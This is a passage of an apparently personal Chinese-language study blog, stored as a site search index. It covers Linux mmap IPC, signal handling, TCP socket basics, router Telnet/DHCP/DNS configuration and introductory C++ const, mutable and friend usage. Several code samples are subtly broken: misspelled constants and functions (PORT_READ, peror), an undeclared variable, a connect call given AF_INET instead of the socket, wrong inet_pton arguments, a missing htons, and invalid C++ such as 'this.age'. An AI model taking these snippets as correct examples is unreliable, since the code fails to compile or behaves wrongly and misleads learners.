class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父子进程使用匿名映射进程间通信</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> *ddr =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//1.创建匿名映射</span></span><br><span class="line">    addr = <span class="built_in">mmap</span>(<span class="literal">NULL</span>,<span class="number">4096</span>,PORT_READ | PORT_WRITE, MAP_SHARED | MAP_ANONYMOUS , <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(MAP_FAILED == addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">peror</span>(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建子进程</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">peror</span>(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="built_in">munmap</span>(addr,<span class="number">4096</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//父子进程通信</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//子进程写</span></span><br><span class="line">        <span class="built_in">memcpy</span>(addr,<span class="string">&quot;13343555555&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//父进程读</span></span><br><span class="line">        <span class="built_in">wait</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent process %s\n&quot;</span>,(<span class="type">char</span> *)addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//4.断开连接</span></span><br><span class="line">    <span class="built_in">munmap</span>(addr,<span class="number">4096</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>信号的概述</strong><br>信号是linux进程间通信的最古老的方式，信号时软件中断，他是在软件层次对中断机制的一种模拟，是一种异步通信的方式。<br>​<br><strong>信号的编号</strong><br><strong>kill -l</strong></p><p>**信号四要素 **<br>每个信号必备4要素：<br>编号，名称，事件，默认处理动作<br>​<br><strong>SIGKILL 和SIGSTOP,不予许被忽略，停止</strong><br><strong>​</strong><br><strong>信号状态</strong><br><img src="/2024/03/13/Linux/1686577886397-2e9a662f-b7c5-4b36-8f26-1b146292def7.png" alt="image.png"></p><p><strong>未决状态：没有被处理</strong><br><strong>递达状态：信号被处理了</strong><br><strong>信号产生函数</strong><br><strong>kill 函数</strong><br><img src="/2024/03/13/Linux/1686578280402-39a83d84-625e-46e9-a72a-60e8ce6f42cf.png" alt="image.png"></p><p><strong>父进程杀死子进程</strong><br><img src="/2024/03/13/Linux/1686578643675-8756261e-12d4-4f1d-ac40-3f70f0a0b847.png" alt="image.png"></p><p><strong>raise函数</strong><br><img src="/2024/03/13/Linux/1686578764711-2f7827c4-6a82-4373-8d3c-d6c319294537.png" alt="image.png"></p><p><img src="/2024/03/13/Linux/1686578837750-207404f1-7ae0-42f0-97fa-3298c8d90d75.png" alt="image.png"></p><p><strong>abort函数</strong><br><img src="/2024/03/13/Linux/1686579046918-72dd0974-511d-45f2-886d-87633da98ec8.png" alt="image.png"></p><p><strong>alarm函数（闹钟）</strong><br><img src="/2024/03/13/Linux/1686579145861-72ef19ec-538b-4e66-aac7-17b9422cea00.png" alt="image.png"></p><p><strong>setitimer函数（定时器）</strong><br><img src="/2024/03/13/Linux/1686579677707-b883d8e3-354c-4584-b4a0-f055986fb3b7.png" alt="image.png"></p><p><img src="/2024/03/13/Linux/1686579716805-45ea07ac-f014-4824-8b6f-8e564d76bbd0.png" alt="image.png"></p><p><strong>signal函数</strong><br><img src="/2024/03/13/Linux/1686580510886-1e5c76c1-10e1-449a-83d2-5e7387bb9723.png" alt="image.png"></p><p><img src="/2024/03/13/Linux/1686580882200-4c2669cd-8352-4aa2-9b63-6f4d5ab3a425.png" alt="image.png"></p><p>使用signal捕捉超时函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//信号处理函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;捕捉到信号:%d\n&quot;</span>,signo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">itimerval</span> tmo;</span><br><span class="line">    <span class="comment">//第一次触发事件</span></span><br><span class="line">    tmo.it_value.tv_sec = <span class="number">3</span>;</span><br><span class="line">    tmo.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//设置触发周期</span></span><br><span class="line">    tmo.it_interval.tv_sec =<span class="number">2</span> ;</span><br><span class="line">    tmo.it_interval.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//捕捉信号</span></span><br><span class="line">    <span class="built_in">signal</span>(SIGALRM,fun);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置定时器</span></span><br><span class="line">    ret = <span class="built_in">setitimer</span>(ITIMER_REAL,&amp;tmo,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ret )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;setitimer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进程收到闹钟超时信号之后就会终止该进程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;按下任意键继续&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>信号集</strong><br><strong>信号集概述</strong><br><img src="/2024/03/13/Linux/1686581929980-576f0084-8aa4-4aef-9bc5-b688e43d74e0.png" alt="image.png"></p><p><strong>sigprocmask函数</strong><br>信号阻塞集也称信号屏蔽集，信号掩码。每个进程都有一个阻塞集，创建子进程时将继承父进程的阻塞集，信号阻塞集用来描述那些信号递送到该进程的时候被阻塞<br>所谓阻塞并不是禁止传送信号，而是暂缓信号的传送，若将被阻塞的信号从信号阻塞集中删除，且对应的信号在阻塞时发生了，进程将收到相应的信号<br>我们可以通过sigprocmask()修改当前的信号掩码来改变信号的阻塞情况<br><img src="/2024/03/13/Linux/1686582673797-5b6548f4-3fda-4210-a8c4-f955623d8b93.png" alt="image.png"></p><p>内核实现信号捕捉过程<br><img src="/2024/03/13/Linux/1686742683852-c13d1b33-1953-4343-8091-c8436eba318e.png" alt="image.png"></p><p>信号捕捉(sigaction)<br><img src="/2024/03/13/Linux/1686743031032-a5e19f6c-b2a7-4735-a9c1-efb87367181e.png" alt="image.png"></p><p>😲<br>linux网络编程桥接模式：虚拟机与物理机一样直连局域网<br>NAT模式：虚拟机和物理机之间通过一块虚拟的网关互联通信，<strong>虚拟机与物理机访问而不能与局域网中的其他主机直接互联，虚拟机是通过物理机中的网卡来实现与局域网中的其他主机通信。</strong><br><img src="/2024/03/13/Linux/1686756511113-45191e44-e002-4028-9fef-46aeccca7dcb.png" alt="image.png"></p><p><strong>套接字（ip地址+端口号）</strong><br><strong>用于不通主机之间的通信</strong><br><img src="/2024/03/13/Linux/1686759032255-dc2edbc9-9409-49cd-b7de-7343f01ad9d3.png" alt="image.png"></p><p>全双工通信<br>​<br><strong>字节序</strong><br><img src="/2024/03/13/Linux/1686759535842-b78c647d-64b8-4120-80c5-29f14ae1458a.png" alt="image.png"></p><p><strong>ip转换</strong><br><strong>#include &lt;arpa&#x2F;inet.h&gt;</strong><br>**int inet_pton(int af,const char <em>src,void <em>dst);</em></em><br><strong>功能：将点分十进制串转成32网络大端的数据(“192.168.1.2”)</strong><br><strong>参数: af</strong><br><strong>AF_INET   IPV4</strong><br><strong>AF_INET6 IPV6</strong><br><strong>src：点分十进制串的首地址</strong><br><strong>dst:32位网络地址</strong><br><strong>成功返回1</strong><br><strong>​</strong><br><strong>#include &lt;arpa&#x2F;inet.h&gt;</strong><br>**const char *inet_ntop(int af,const void <strong><strong><strong>src</strong></strong>*,char *dst,socklen_t size);</strong><br><img src="/2024/03/13/Linux/1686760629624-1eb1ee8b-068a-433f-a05f-a9515598b4c6.png" alt="image.png"></p><p>点分十进制串   -》点分十进制值   发送数据<br>点分十进制值   -》点分十进制串    接收数据<br><img src="/2024/03/13/Linux/1697544286517-8a1bb6f1-f118-4ac1-9df8-db1c967ccc70.png" alt="image.png"></p><p>接受数据<br><img src="/2024/03/13/Linux/1697545645160-fd4c3779-1cc6-43ee-aaaa-bfa0de7e8ba5.png" alt="image.png"></p><p>linux网络编程-IPv4套接字结构体网络通信协议三大问题    协议    ip    端口  -》封装成结构体<br><img src="/2024/03/13/Linux/1697545894123-6b6e51a5-5323-42ae-81a6-9fba6852ea79.png" alt="image.png"></p><p>sin_family:协议<br>sin_port:端口<br>sin_addr:ip</p><p>通用套接字结构体<br><img src="/2024/03/13/Linux/1697546266850-48542ff2-a783-4102-a936-91ddced4f36d.png" alt="image.png"></p><p>linux网络编程-tcp传输控制协议    特点：出错重传   每次发送都会受到确认帧   安全<br><img src="/2024/03/13/Linux/1697546514369-0287196f-3129-49af-8660-1881c9597d24.png" alt="image.png"></p><p> 创建套接字api<br><img src="/2024/03/13/Linux/1697546660697-66c4a5ed-a0cc-40d6-a5c4-57a0ba4c53f7.png" alt="image.png"></p><p>domain：协议  AF_INET<br>type:传输类型  tcp  udp<br><img src="/2024/03/13/Linux/1697546756918-4395c0bb-992c-4c60-bd30-0b6d877f5469.png" alt="image.png"></p><p>上面只需组应用层的包<br>protocol:0<br>成功返回文件描述符<br>​<br>连接服务器api<br><img src="/2024/03/13/Linux/1697546872849-853e9b74-143a-4faa-b2ee-7228fd6a1ca9.png" alt="image.png"></p><p>sockfd:socket套接字<br>addr:ipv4套接字结构体的地址<br>addrlen:ipv4套接字结构体的长度<br>​<br><img src="/2024/03/13/Linux/1697548468343-b6d714f3-f2cf-4b64-bd6a-ba95562543f7.png" alt="image.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line"><span class="type">int</span> sock_fd;</span><br><span class="line">sock_fd = <span class="built_in">socket</span>(AF_INET,SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//链接服务器</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = <span class="number">80</span>;</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;&quot;</span>, addr.sin_addr.s_addr);</span><br><span class="line"><span class="built_in">connect</span>(AF_INET, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">//读写数据</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">write</span>(sock_fd, buf,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(sock_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相关应用层服务</title>
      <link href="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>FTP服务<br><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683281473108-5dd50d2f-a57a-4fba-aa51-f3242619734d.png" alt="1683281473108-5dd50d2f-a57a-4fba-aa51-f3242619734d"></p><p><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683281575143-242c5475-957c-4894-b356-c161436c7cdc.png" alt="1683281575143-242c5475-957c-4894-b356-c161436c7cdc"></p><p>Telnet服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//开启服务</span><br><span class="line">telnet server enable</span><br><span class="line">//进入用户视图</span><br><span class="line">user-interface vty</span><br><span class="line">//配置vty用户界面支持的协议</span><br><span class="line">potocol inbound all|telnet</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683285744350-ef0c1704-1668-4609-b620-4471d2a9ee6a.png" alt="1683285744350-ef0c1704-1668-4609-b620-4471d2a9ee6a"></p><p><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683285849488-c9f97773-ccc0-47dd-9a89-e14fe02fbee5.png" alt="1683285849488-c9f97773-ccc0-47dd-9a89-e14fe02fbee5"></p><p><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683285955884-19763b95-267c-438e-b524-55741a5f7d04.png" alt="1683285955884-19763b95-267c-438e-b524-55741a5f7d04"></p><p>[R1-aaa]local-user r21 privilege level 3  &#x2F;&#x2F;设置权限</p><p>&#x2F;&#x2F;设置成功之后从别的设备访问该telnet服务<br><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683286140861-7689eca4-711f-4a2a-b604-c073c198ae26.png" alt="1683286140861-7689eca4-711f-4a2a-b604-c073c198ae26"></p><p>Dhcp服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//开启dhcp服务</span><br><span class="line">dhcp enable</span><br><span class="line">//在相应接口上开启dhcp服务</span><br><span class="line">[r1-Ethernet0/0/0]dhcp select interface </span><br><span class="line">//设置租期</span><br><span class="line">[r1-Ethernet0/0/0]dhcp server lease day 2</span><br><span class="line"></span><br><span class="line">//查看ip地址池</span><br><span class="line">dislay ip pool</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>http服务<br>www（world wide web）html http url<br>Dns服务</p><p>网络拓扑如下<br><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683290578261-b85439c8-a30f-4c14-9f49-7854e525e54c.png" alt="1683290578261-b85439c8-a30f-4c14-9f49-7854e525e54c"></p><p>server2为dns服务器<br>pc1是通过dhcp服务来获取ip地址<br>所以在r2中的e&#x2F;0&#x2F;0&#x2F;0接口中设置dns list 如下<br><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683290696381-2c345c60-092b-4511-bc7b-c91aad43b001.png" alt="1683290696381-2c345c60-092b-4511-bc7b-c91aad43b001"></p><p>成功ping通<br><img src="/2024/03/13/%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8%E5%B1%82%E6%9C%8D%E5%8A%A1/1683290930417-1f36f239-0463-4cdd-95de-6cf8fbffed2e.png" alt="1683290930417-1f36f239-0463-4cdd-95de-6cf8fbffed2e"></p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用层 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++学习手册</title>
      <link href="/2024/03/13/c-%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C/"/>
      <url>/2024/03/13/c-%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<p>在标准c++中，main函数的定义是<br><strong>int main(int argc,char</strong> argv){}**<br><strong>​</strong><br><strong>但是从学习c语言开始，我就从来没有关注过argc,argv这个参数，于是今天系统的了解了下</strong><br><strong>其中：argc   表示参数个数   最低是1，就是程序本身</strong><br>**          argv  表示参数名称，可以有多个，这个取决于用户**<br><strong>​</strong><br>main函数 例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc ,<span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;argv[<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;argc;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            string arg = argv[i];</span><br><span class="line">            <span class="keyword">if</span>(arg == <span class="string">&quot;-h&quot;</span> || arg == <span class="string">&quot;-help&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;there are some useful tips for you&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (arg == <span class="string">&quot;-v&quot;</span> || arg == <span class="string">&quot;-version&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;the version is 1.0.0&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;command not found&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译：g++  program.cpp  -o program **<br><strong>运行: .&#x2F;program  -h -v  ji</strong><br><strong>结果：there are some useful tips for you</strong><br>**          the version is 1.0.0</strong><br>**          command not found**<br><strong>​</strong><br><strong>这就是main函数中各参数的意义以及使用方式</strong><br>​</p><p>c++面向对象<strong>静态属性变量</strong><br><strong>1.编译阶段分配内存</strong><br><strong>2.所有对象共享一份</strong><br><strong>3.类内声明，类外初始化</strong><br><strong>​</strong><br><strong>静态变量可以通过类名访问</strong><br><strong>常函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//this指针的本质 是指针常量 指针的指向是不能修改的</span><br><span class="line">    //在成员函数后面加const，修饰的是this指向，让指针指向的值也不可以修改</span><br><span class="line">    void sum() const</span><br><span class="line">    &#123;</span><br><span class="line">       this-&gt;age=10; //不正确 </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//在类中加上mutable关键字，则可以在常函数中修改变量的值</span><br><span class="line"></span><br><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">     int id;</span><br><span class="line">     mutable int age;</span><br><span class="line"></span><br><span class="line">     void sum() const</span><br><span class="line">     &#123;</span><br><span class="line">         this.age = 10;//正确</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     void say();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>常对象</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">   const person p;//常对象</span><br><span class="line">   p.id=10;//不正确，常对象不可访问成员变量除非使用mutable修饰</span><br><span class="line">   p.age = 10;//正确</span><br><span class="line">   //常对象只能调用常函数</span><br><span class="line">   p.sum();//正确</span><br><span class="line">   p.say();//不正确</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>友元</strong><br><strong>在程序里，有些私有属性也想让类外特殊的一些函数或者类访问，就需要用到友元技术。</strong><br><strong>友元的目的就是让一个函数或者类访问一个类中私有成员</strong><br>友元的关键字 friend<br>1.全局函数做友元<br>2.类做友元<br>3.成员函数做友元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">  public:</span><br><span class="line">         string livingroom</span><br><span class="line">         person()</span><br><span class="line">         &#123;</span><br><span class="line">              livingroom=&quot;客厅&quot;;</span><br><span class="line">              bedroom=&quot;卧室&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">private:</span><br><span class="line">         string bedroom;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void invite(person *p)</span><br><span class="line">&#123;</span><br><span class="line">  cout&lt;&lt;p-&gt;livingroom;</span><br><span class="line">  cout&lt;&lt;p-&gt;bedroom;//不正确，因为bedroom是私有成员变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  person p1;</span><br><span class="line">  invite(&amp;p1);//不正确</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//全局友元的使用</span><br><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">  friend void invite(person *p);</span><br><span class="line">  public:</span><br><span class="line">         string livingroom</span><br><span class="line">         person()</span><br><span class="line">         &#123;</span><br><span class="line">              livingroom=&quot;客厅&quot;;</span><br><span class="line">              bedroom=&quot;卧室&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">private:</span><br><span class="line">         string bedroom;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void invite(person *p)</span><br><span class="line">&#123;</span><br><span class="line">  cout&lt;&lt;p-&gt;livingroom;</span><br><span class="line">  cout&lt;&lt;p-&gt;bedroom;//正确，因为void invite(person *p)被friend修饰</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  person p1;</span><br><span class="line">  